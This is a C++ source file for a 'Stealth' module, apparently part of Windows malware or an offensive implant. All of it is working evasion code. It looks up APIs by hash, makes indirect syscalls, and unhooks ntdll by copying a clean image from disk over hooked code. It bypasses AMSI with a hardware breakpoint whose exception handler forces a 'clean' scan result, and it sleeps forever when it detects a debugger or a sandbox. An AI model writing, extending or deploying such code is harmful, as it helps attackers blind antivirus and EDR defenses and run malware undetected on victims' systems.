#include "Stealth.h"
#include "Logger.h"
#include <winternl.h>
#include <intrin.h>
#include <vector>
#include <ctype.h>
#include <algorithm>
#include <tlhelp32.h>
#include "Obfuscator.h"

namespace Stealth {

    std::wstring DecryptInternal(const std::vector<unsigned char>& data, unsigned char key) {
        std::string dec;
        for (auto b : data) dec += (char)(b ^ key);
        std::wstring wdec;
        for (char c : dec) wdec += (wchar_t)c;
        return wdec;
    }

    bool StrCompare(const char* s1, const char* s2) {
        while (*s1 && (*s1 == *s2)) { s1++; s2++; }
        return *(unsigned char*)s1 - *(unsigned char*)s2 == 0;
    }

    #ifdef _WIN64
    #define GetPEB() (PPEB)__readgsqword(0x60)
    #else
    #define GetPEB() (PPEB)__readfsdword(0x30)
    #endif

    HMODULE GetModuleByHash(DWORD moduleHash) {
        PPEB peb = GetPEB();
        PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
        PLIST_ENTRY curr = head->Flink;
        while (curr != head) {
            PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            if (entry->FullDllName.Buffer) {
                std::wstring wname(entry->FullDllName.Buffer);
                std::string sName;
                for (wchar_t wc : wname) sName += (char)tolower((int)wc);
                size_t lastSlash = sName.find_last_of("\\/");
                std::string filename = (lastSlash == std::string::npos) ? sName : sName.substr(lastSlash + 1);
                if (HashApi(filename.c_str()) == moduleHash) return (HMODULE)entry->DllBase;
            }
            curr = curr->Flink;
        }
        return nullptr;
    }

    FARPROC GetApiByHash(HMODULE hModule, DWORD funcHash) {
        if (!hModule) return nullptr;
        PBYTE base = (PBYTE)hModule;
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(base + dosHeader->e_lfanew);
        DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (exportDirRVA == 0) return nullptr;
        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(base + exportDirRVA);
        PDWORD names = (PDWORD)(base + exportDir->AddressOfNames);
        PDWORD functions = (PDWORD)(base + exportDir->AddressOfFunctions);
        PWORD ordinals = (PWORD)(base + exportDir->AddressOfNameOrdinals);
        for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
            const char* name = (const char*)(base + names[i]);
            if (HashApi(name) == funcHash) return (FARPROC)(base + functions[ordinals[i]]);
            if (name[0] == 'Z' && name[1] == 'w' && HashApi(("Nt" + std::string(name + 2)).c_str()) == funcHash) return (FARPROC)(base + functions[ordinals[i]]);
            if (name[0] == 'N' && name[1] == 't' && HashApi(("Zw" + std::string(name + 2)).c_str()) == funcHash) return (FARPROC)(base + functions[ordinals[i]]);
        }
        return nullptr;
    }

    struct SSN_MAP_ENTRY { DWORD hash; WORD ssn; PVOID address; };
    std::vector<SSN_MAP_ENTRY> g_ssnMap;

    void BuildSSNMap() {
        if (!g_ssnMap.empty()) return;
        HMODULE hNtdll = GetModuleByHash(Hashes::ntdll);
        if (!hNtdll) return;
        PBYTE base = (PBYTE)hNtdll;
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + dos->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        PDWORD names = (PDWORD)(base + exports->AddressOfNames);
        PDWORD functions = (PDWORD)(base + exports->AddressOfFunctions);
        PWORD ordinals = (PWORD)(base + exports->AddressOfNameOrdinals);
        for (DWORD i = 0; i < exports->NumberOfNames; i++) {
            const char* name = (const char*)(base + names[i]);
            if (name[0] == 'Z' && name[1] == 'w') {
                PVOID addr = (PVOID)(base + functions[ordinals[i]]);
                if (*((PBYTE)addr) == 0x4C && *((PBYTE)addr + 3) == 0xB8) {
                    g_ssnMap.push_back({ HashApi(name), 0, addr });
                    g_ssnMap.push_back({ HashApi(("Nt" + std::string(name + 2)).c_str()), 0, addr });
                }
            }
        }
        std::sort(g_ssnMap.begin(), g_ssnMap.end(), [](const SSN_MAP_ENTRY& a, const SSN_MAP_ENTRY& b) { return a.address < b.address; });
        for (WORD i = 0, ssn = 0; i < (WORD)g_ssnMap.size(); i++) {
            if (i > 0 && g_ssnMap[i].address != g_ssnMap[i-1].address) ssn++;
            g_ssnMap[i].ssn = ssn;
        }
    }

    WORD GetSSNByHashSilent(DWORD funcHash) {
        BuildSSNMap();
        for (auto& entry : g_ssnMap) { if (entry.hash == funcHash) return entry.ssn; }
        return 0;
    }

    PVOID GetSyscallGadget() {
        HMODULE hNtdll = GetModuleByHash(Hashes::ntdll);
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + dos->e_lfanew);
        PIMAGE_SECTION_HEADER text = IMAGE_FIRST_SECTION(nt);
        PBYTE start = (PBYTE)hNtdll + text->VirtualAddress;
        PBYTE end = start + text->Misc.VirtualSize;
        for (PBYTE p = start; p < end - 2; p++) { if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) return (PVOID)p; }
        return nullptr;
    }

    void SetThreadsState(bool suspend) {
        DWORD pid = CALL_API(Hashes::kernel32, Hashes::GetCurrentProcessId, GetCurrentProcessId);
        DWORD tid = CALL_API(Hashes::kernel32, Hashes::GetCurrentThreadId, GetCurrentThreadId);
        HANDLE hSnap = (HANDLE)CALL_API(Hashes::kernel32, Hashes::CreateToolhelp32Snapshot, CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, 0);
        if (hSnap == INVALID_HANDLE_VALUE) return;
        THREADENTRY32 te = { sizeof(te) };
        if (CALL_API(Hashes::kernel32, Hashes::Thread32First, Thread32First, hSnap, &te)) {
            do {
                if (te.th32OwnerProcessID == pid && te.th32ThreadID != tid) {
                    auto pOpenThread = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))GetApiByHash(GetModuleByHash(Hashes::kernel32), Hashes::OpenThread);
                    if (pOpenThread) {
                        HANDLE hThread = pOpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                        if (hThread) {
                            if (suspend) CALL_API(Hashes::kernel32, Hashes::SuspendThread, SuspendThread, hThread);
                            else CALL_API(Hashes::kernel32, Hashes::ResumeThread, ResumeThread, hThread);
                            CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, hThread);
                        }
                    }
                }
            } while (CALL_API(Hashes::kernel32, Hashes::Thread32Next, Thread32Next, hSnap, &te));
        }
        CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, hSnap);
    }

    LONG CALLBACK StealthVEH(PEXCEPTION_POINTERS ExceptionInfo) {
        if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
             HMODULE hAmsi = GetModuleByHash(Hashes::amsi);
             FARPROC pAmsiScan = GetApiByHash(hAmsi, HashApi("AmsiScanBuffer"));
            if (ExceptionInfo->ContextRecord->Rip == (DWORD64)pAmsiScan) {
                PVOID pResult = *(PVOID*)(ExceptionInfo->ContextRecord->Rsp + 48);
                if (pResult) *(DWORD*)pResult = 0; // AMSI_RESULT_CLEAN
                ExceptionInfo->ContextRecord->Rax = 0; // S_OK
                ExceptionInfo->ContextRecord->Rip = *(PDWORD64)ExceptionInfo->ContextRecord->Rsp;
                ExceptionInfo->ContextRecord->Rsp += 8;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
        return EXCEPTION_CONTINUE_SEARCH;
    }

    bool SetHardwareBreakpoint(PVOID address, int registerIndex) {
        CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        HANDLE hThread = (HANDLE)CALL_API(Hashes::kernel32, Hashes::GetCurrentThread, GetCurrentThread);
        if (CALL_API(Hashes::kernel32, Hashes::GetThreadContext, GetThreadContext, hThread, &ctx)) {
            switch (registerIndex) {
                case 0: ctx.Dr0 = (DWORD64)address; break;
                case 1: ctx.Dr1 = (DWORD64)address; break;
                case 2: ctx.Dr2 = (DWORD64)address; break;
                case 3: ctx.Dr3 = (DWORD64)address; break;
            }
            ctx.Dr7 |= (1ULL << (2 * registerIndex));
            return (bool)CALL_API(Hashes::kernel32, Hashes::SetThreadContext, SetThreadContext, hThread, &ctx);
        }
        return false;
    }

    void BypassAMSI_Silent() {
        HMODULE hAmsi = (HMODULE)CALL_API(Hashes::kernel32, Hashes::LoadLibraryW, LoadLibraryW, DecryptInternal({0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c}, 0x00).c_str());
        if (!hAmsi) return;
        PVOID pScanBuffer = (PVOID)GetApiByHash(hAmsi, HashApi("AmsiScanBuffer"));
        if (!pScanBuffer) return;
        auto pAddVEH = (PVOID(WINAPI*)(ULONG, PVECTORED_EXCEPTION_HANDLER))GetApiByHash(GetModuleByHash(Hashes::kernel32), Hashes::AddVectoredExceptionHandler);
        if (pAddVEH) {
            pAddVEH(1, StealthVEH);
            SetHardwareBreakpoint(pScanBuffer, 0);
        }
    }

    void UnhookNtdll_Silent() {
        HMODULE hKernel32 = GetModuleByHash(Hashes::kernel32);
        HMODULE hNtdll = GetModuleByHash(Hashes::ntdll);
        if (!hKernel32 || !hNtdll) return;
        auto pCreateFileW = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))GetApiByHash(hKernel32, Hashes::CreateFileW);
        if (!pCreateFileW) return;
        std::wstring path = DecryptInternal({0x43, 0x3a, 0x5c, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x5c, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33, 0x32, 0x5c, 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c}, 0x00);
        HANDLE hFile = pCreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return;
        WORD ssnProtect = GetSSNByHashSilent(Hashes::NtProtectVirtualMemory);
        WORD ssnMapView = GetSSNByHashSilent(Hashes::NtMapViewOfSection);
        WORD ssnCreateSection = GetSSNByHashSilent(Hashes::NtCreateSection);
        PVOID gadget = GetSyscallGadget();
        if (ssnCreateSection && ssnMapView && gadget) {
            HANDLE hSection = NULL;
            #ifdef _WIN64
            if (IndirectSyscall(ssnCreateSection, gadget, &hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile) == 0) {
                PVOID pMapping = NULL; SIZE_T viewSize = 0;
                if (IndirectSyscall(ssnMapView, gadget, hSection, (HANDLE)-1, &pMapping, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY) == 0) {
                    SetThreadsState(true);
                    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
                    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + dosHeader->e_lfanew);
                    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
                        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)IMAGE_FIRST_SECTION(ntHeaders) + (i * IMAGE_SIZEOF_SECTION_HEADER));
                        if (StrCompare((const char*)sectionHeader->Name, ".text")) {
                            DWORD oldProtect; PVOID lpAddress = (PVOID)((PBYTE)hNtdll + sectionHeader->VirtualAddress); SIZE_T dwSize = sectionHeader->Misc.VirtualSize;
                            if (IndirectSyscall(ssnProtect, gadget, (HANDLE)-1, &lpAddress, &dwSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
                                memcpy(lpAddress, (PVOID)((PBYTE)pMapping + sectionHeader->VirtualAddress), dwSize);
                                IndirectSyscall(ssnProtect, gadget, (HANDLE)-1, &lpAddress, &dwSize, oldProtect, &oldProtect);
                            }
                            break;
                        }
                    }
                    SetThreadsState(false);
                }
            }
            #endif
        }
        CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, hFile);
    }

    bool IsBeingAnalyzed() {
        HMODULE hKernel32 = GetModuleByHash(Hashes::kernel32);
        auto pIsDebuggerPresent = (BOOL(WINAPI*)())GetApiByHash(hKernel32, Hashes::IsDebuggerPresent);
        if (pIsDebuggerPresent && pIsDebuggerPresent()) return true;
        SYSTEM_INFO si;
        auto pGetSystemInfo = (void(WINAPI*)(LPSYSTEM_INFO))GetApiByHash(hKernel32, Hashes::GetSystemInfo);
        if (pGetSystemInfo) { pGetSystemInfo(&si); if (si.dwNumberOfProcessors < 2) return true; }
        MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
        auto pGlobalMemoryStatusEx = (BOOL(WINAPI*)(LPMEMORYSTATUSEX))GetApiByHash(hKernel32, Hashes::GlobalMemoryStatusEx);
        if (pGlobalMemoryStatusEx && pGlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < (3ULL * 1024 * 1024 * 1024)) return true;
        return false;
    }

    void Initialize() {
        UnhookNtdll_Silent();
        BypassAMSI_Silent();
        if (IsBeingAnalyzed()) {
            HMODULE hKernel32 = GetModuleByHash(Hashes::kernel32);
            auto pSleep = (void(WINAPI*)(DWORD))GetApiByHash(hKernel32, Hashes::Sleep);
            while (true) if (pSleep) pSleep(10000); else break;
        }
    }
}
